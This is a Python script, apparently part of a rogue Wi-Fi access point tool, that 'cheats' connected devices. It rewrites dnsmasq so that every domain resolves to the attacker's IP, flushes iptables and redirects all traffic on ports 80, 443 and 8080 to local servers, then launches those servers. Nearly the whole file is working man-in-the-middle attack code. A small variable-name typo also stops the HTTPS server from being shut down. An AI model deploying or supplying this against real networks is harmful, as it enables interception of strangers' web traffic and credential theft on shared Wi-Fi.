#! /usr/bin/env python3
"""
Script to do cheating with station who connected to this local AP.
"""

from public import AP_IP, IP_ST, IP_ED
http_proc = None
http_alt_proc = None
https_proc = None

def dns_cheat(ap_face):
    """
    rewrite previous launched dnsmasq to start dns cheat.
    """
    os.system('killall dnsmasq')

    with open('/etc/dnsmasq.conf', 'w+') as f:
        f.write('interface=' + ap_face + '\n' +
                'dhcp-range=' + IP_ST + ',' + IP_ED + ',12h\n' +
                'server=' + AP_IP + '\n' +
                'address=/#/' + AP_IP + '\n'
                )
    os.system('dnsmasq')


def ip_cheat():
    """
    redirect all http traffic to local http server.
    """

    os.system('iptables --flush')
    os.system('iptables -t nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables -t nat --delete-chain')

    os.system('echo \'1\' > /proc/sys/net/ipv4/ip_forward')
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 192.168.1.1:80")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to 192.168.1.1:443")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to 192.168.1.1:8080")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")


def start_cheat_server():
    """
    start http server serving at port 80, 8080 and 443 perspectively.
    """
    import subprocess

    print("Starting http server on port 80...")
    global http_proc
    http_proc = subprocess.Popen(["python3", "serve_http.py"], cwd="server/")

    print("Starting http_alt server on port 8080...")
    global http_alt_proc
    http_alt_proc = subprocess.Popen(["python3", "serve_http_alt.py"], cwd="server/")

    print("Starting https server on port 443...")
    global https_porc
    https_porc = subprocess.Popen(["python3", "serve_https.py"], cwd="server/")

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description="XXXXXXXXXX.")
    parser.add_argument('-i', required=True, dest='interface', help='')
    return parser.parse_args()


if __name__ == '__main__':

    import sys
    import os

    # check python version
    if sys.version[0] != '3':
        print("Python3 is needed.")
        sys.exit(-1)

    # # check if has root privilege
    # if os.geteuid() != 0:
    #     print("Wificmd must be run as root")
    #     sys.exit(-1)

    args = parse_args()

    print("Starting dns spoof...")
    dns_cheat(args.interface)

    print("Starting iptables spoof...")
    ip_cheat()

    start_cheat_server()

    try:
        input()
    except KeyboardInterrupt:
        if http_proc is not None:
            http_proc.terminate()
        if http_alt_proc is not None:
            http_alt_proc.terminate()
        if https_proc is not None:
            https_proc.terminate()
        print("\nExit")
